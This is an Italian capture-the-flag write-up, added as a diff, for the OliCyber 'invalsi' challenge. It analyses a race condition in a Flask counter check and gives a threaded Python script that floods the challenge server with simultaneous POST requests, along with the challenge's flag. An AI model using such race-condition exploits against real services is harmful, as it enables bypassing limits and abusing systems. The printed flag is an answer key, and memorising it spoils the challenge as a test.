@@ -1,0 +1,55 @@
+Data: 4 Gennaio 2026
+
+Vulnerabilità: Race Condition (CWE-362)
+
+Target: http://invalsi.challs.olicyber.it/
+
+Flag: flag{57up1d0_53xy_f4b10_64b1bb0}
+
+1. Analisi del Codice Sorgente
+Il server Flask analizzato presenta una gestione del contatore utente (count) all'interno della rotta principale /. La logica di incremento è protetta da un controllo che permette l'aggiornamento solo se il contatore è pari a zero.
+
+Python
+
+if request.headers.get('Content-Type') == "application/json" and count == 0:
+    data = request.json
+    # ...
+    for r in data[:10]:
+        time.sleep(0.1) # Ritardo critico
+    local_db[user_id] += 1
+Criticità individuate:
+
+
+Assenza di Atomicità: Il controllo del valore (count == 0) e il suo incremento (+= 1) non avvengono in un'unica operazione atomica.
+
+Ritardo Volontario: L'uso di time.sleep(0.1) all'interno di un ciclo crea una finestra temporale di circa 1 secondo in cui il valore nel database rimane invariato (0), pur essendo la richiesta in fase di elaborazione.
+
+2. Strategia di Attacco (Race Condition)
+L'attacco si basa sull'invio di richieste multiple simultanee. Sfruttando la latenza introdotta dal server, è possibile far sì che più processi leggano count = 0 contemporaneamente prima che il primo processo termini la sua esecuzione e aggiorni il valore a 1.
+
+Fasi dell'exploit:
+Session Management: Creazione di una sessione persistente per mantenere lo stesso user_id tra le richieste.
+
+Multi-threading: Utilizzo di thread paralleli per saturare il server con richieste POST identiche.
+
+Trigger: Invio di un array JSON di 10 elementi per massimizzare il tempo di sleep del server.
+
+3. Exploit Script (Python)
+Python
+
+import requests
+import threading
+
+URL = "http://invalsi.challs.olicyber.it/"
+s = requests.Session()
+s.get(URL) # Inizializzazione sessione
+
+def exploit():
+    headers = {'Content-Type': 'application/json'}
+    s.post(URL, json=[1,2,3,4,5,6,7,8,9,10], headers=headers)
+
+threads = [threading.Thread(target=exploit) for _ in range(20)]
+for t in threads: t.start()
+for t in threads: t.join()
+
+print(s.get(URL + "flag").text)
